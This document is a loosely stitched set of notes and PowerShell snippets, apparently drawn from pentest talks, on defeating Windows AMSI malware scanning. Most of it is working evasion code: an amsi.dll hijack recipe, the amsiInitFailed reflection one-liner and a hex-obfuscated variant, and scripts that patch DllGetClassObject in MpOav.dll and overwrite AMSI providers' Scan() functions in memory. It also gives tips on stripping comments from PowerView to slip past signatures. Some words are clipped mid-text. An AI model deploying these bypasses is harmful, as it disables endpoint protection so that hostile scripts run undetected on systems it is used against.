//

IAntimalwareProvider
	main principle of AMSI.

//
In extreme cases, we’ve seen attackers bring along entire virtual machines to conceal their scripts from detection.  Ragnar Locker, for example, deployed a VirtualBox virtual machine as part of a ransomware attack, concealing its processes from malware scanners entirely.

//
Create an empty DLL named “amsi.dll” in a target directory;
Copy PowerShell.exe to the same directory;
Launch evil PowerShell script, and AMSI scans attempted by the PowerShell.exe copy will fail because the fake DLL is loaded first.
wever, Microsoft has since made changes to PowerShell’s code that cause it to crash if the proper interfaces aren’t available in amsi.dll. In order for a DLL hijack of this type to work, the attacker now has to provide a counterfeit DLL with the required interfaces defined.

// Enable PSv2
Enable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root

//
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils’).GetField('amsiInitFailed’,'NonPublic,Static’).SetValue($null,$true)

//
[System.Convert]::ToBase64String([System.Text.Encoding]::UNICODE.GetBytes("AmsiUtils"))
[System.Convert]::ToBase64String([System.Text.Encoding]::UNICODE.GetBytes("amsiInitFailed"))

//
'AmsiUtils' | Format-Hex
'amsiInitFailed' | Format-Hex -Encoding utf8


//
Decoding at runtime and therefore one more valid bypass looks like this:
[Ref].Assembly.GetType('System.Management.Automation.'+$("41 6D 73 69 55 74 69 6C 73".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)).GetField($("61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),'NonPublic,Static').SetValue($null,$true)

//
AES oder 3DES 
 In comparison to encoding, encryption offers the most reliable way of bypassing signatures


 //

 Until today I still use open source powershell projects in most pentests, although there are measures like “constrained language mode”, “AMSI” or “script block logging”. Many companies have implemented only some or none of these measures. If they have been implemented, any script can be run in a C# powershell runspace to bypass the protection mechanisms. I will therefore take as another example a script that has been flagged for a very long time, Powerview.ps1 from the recently archived PowerSploit repository. The first thing we should always do is removing all the comments, i found many triggers for comments in the past. In addition we have less code to load. Its possible to remove them via regex for example but this time im going for it using ISE-Steroids:


//
Provider patching

TLDR: The new technique will cause a
failure in the AMSI initialization process that
will break the AMSI chain

Done by patching a non-monitored memory
outside the amsi.dll area 

To understand it, let’s dive deep into the
AMSI internals

1st Provider patch

We’ll corrupt something that is not so intuitive to protect –
the provider itself


Patch the prologue bytes of the DllGetClassObject
function in the providers’ DLLs and interfere with the
initialization process of AMSI

AmsiUtils.Uninitialize()


1st Bypass Script
	Example - patch the provider’s DLL of Microsoft (MpOav.dll( 
	More sophisticated - query the appropriate registry keys to find all the providers’ DLLs

Add-Type $APIs
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
$LoadLibrary = [APIs]::LoadLibrary("MpOav.dll")
$Address = [APIs]::GetProcAddress($LoadLibrary,
"DllGetClassObject")
$p = 0
[APIs]::VirtualProtect($Address, [uint32]6, 0x40, [ref]$p)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
$object = [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils')
$Uninitialize = $object.GetMethods("NonPublic,static") | Where-Object Name -eq Uninitialize
$Uninitialize.Invoke($object,$null) 






//
Add-Type replacement

Add-Type causes the code to be written to a temporary file on the disk.
Then csc.exe is used to compile this code into a binary.
Artifacts on disk may cause AV detection

Reflection = souce





//

$LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
$LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
$LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr,
$LoadLibraryDelegate)
$GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
$GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
$GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr,
$GetProcAddressDelegate)
$VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
$VistualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr,
$VistualProtectDelegate)
$hModule = $LoadLibrary.Invoke("MpOav.dll")
$DllGetClassObjectAddress = $GetProcAddress.Invoke($hModule,
"DllGetClassObject")
$p = 0
$VirtualProtect.Invoke($DllGetClassObjectAddress, [uint32]6, 0x40, [ref]$p) | Out-Null
$ret_minus = [byte[]] (0xb8, 0xff, 0xff, 0xff, 0xff, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($ret_minus, 0, $DllGetClassObjectAddress, 3)
$object = [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils')
$Uninitialize = $object.GetMethods("NonPublic,static") | Where-Object Name -eq Uninitialize
$Uninitialize.Invoke($object,$null)



//
2nd Bypass – Scanning Interception

et’s say we can’t \ don’t want to un-initialize AMS

We can intercept AMSI’s scan process instead of initialization (like the classic
AmsiScanBuffer patch does, but without touching amsi.dll)

AmsiScanBuffer calls the IAntimalwareProvider::Scan() for each registered AMSI provider 




If a provider returns a result other than AMSI_RESULT_NOT_DETECTED \
AMSI_RESULT_CLEAN, the scanning stops and returns the result without calling the
remaining providers

//
32 bit below
//


[DllImport("amsi")]
public static extern int AmsiInitialize(string appName, out IntPtr context);
$SIZE_OF_PTR = 4; $NUM_OF_PROVIDERS = 2; $ctx = 0; $p = 0
$ret_zero = [byte[]] (0xb8, 0x0, 0x00, 0x00, 0x00, 0xC3)
[APIs]::AmsiInitialize("MyAmsiScanner", [ref]$ctx)
for ($i = 0; $i -lt $NUM_OF_PROVIDERS; $i++)
{
$CAmsiAntimalware = [System.Runtime.InteropServices.Marshal]::ReadInt32($ctx+8)
$AntimalwareProvider = [System.Runtime.InteropServices.Marshal]::ReadInt32($CAmsiAntimalware+36
+($i*$SIZE_OF_PTR))
$AntimalwareProviderVtbl = [System.Runtime.InteropServices.Marshal]::ReadInt32($AntimalwareProvider)
$AmsiProviderScanFunc = [System.Runtime.InteropServices.Marshal]::ReadInt32($AntimalwareProviderVtbl+12)
[APIs]::VirtualProtect($AmsiProviderScanFunc, [uint32]6, 0x40, [ref]$p)
[System.Runtime.InteropServices.Marshal]::Copy($ret_zero, 0, $AmsiProviderScanFunc, 6)
}







